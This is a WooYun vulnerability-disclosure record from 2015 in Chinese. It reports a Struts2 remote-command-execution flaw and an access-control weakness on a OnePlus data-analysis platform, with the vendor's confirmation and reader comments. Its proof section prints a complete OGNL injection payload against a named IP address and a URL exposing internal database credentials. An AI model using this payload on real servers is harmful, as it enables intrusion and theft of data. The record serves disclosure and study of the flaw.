{"id": 45384, "wybug_id": "wooyun-2015-096120", "wybug_title": "一加某平台多个漏洞+敏感信息泄露", "wybug_corp": "oneplus.cn", "wybug_author": "7z1", "wybug_date": "2015-02-07 09:35", "wybug_open_date": "2015-03-24 09:36", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-24：\t细节向公众公开  简要描述： 一加我又来了 上次送木制收纳盒，这次送什么捏  ？  hoho  (^.^)    顺便祝各位白帽子黑帽子新年快乐~ 详细说明：  一加数据分析平台存在多个漏洞：\n1.Apache struts 远程命令执行2.脆弱的访问验证导致敏感信息泄露\n关于 一加数据分析平台 后台登陆验证居然只做了强制跳转……  ￣□￣｜｜    漏洞证明：  Apache struts 远程命令执行\nhttp://125.88.171.175:8080/doAction.actionPOST DATA:debug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'dir'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[10000],#d.read(#e),#resp.println(#e),#resp.close()\n\n\n脆弱的访问验证导致敏感信息泄露，泄露了内网多个数据库连接信息，感觉差不多了~\ntest url:http://125.88.171.175:8080/jobConf/jobConf/index.jsp?rp_id=0_7_1&rp_pid=0_7&rp_name=t_dim_db\n\n\n\n\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 7z1@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-02-07 12:20 厂商回复： 非常感谢您的报告，问题已着手处理，感谢对一加业务安全的关注。     最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-07 10:44 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  @7z1 好眼力，咋找到的？C段？    \n     2015-02-07 11:03 |    \t\t7z1 \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:14        | 黑客：探险家、网络中的幽灵、用技术捍卫正...)\t\t \n  @BMa 恩    \n     2015-02-07 11:13 |    \t\t7z1 \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:14        | 黑客：探险家、网络中的幽灵、用技术捍卫正...)\t\t \n  昨夜搞得太晚，提交之后发现口子越撕越大，但是乌云提交漏洞没法编辑，一觉醒来就审核了 ò.ó！    \n     2015-02-07 11:15 |    \t\t7z1 \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:14        | 黑客：探险家、网络中的幽灵、用技术捍卫正...)\t\t \n  一系列的问题造成的威胁挺大的……     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}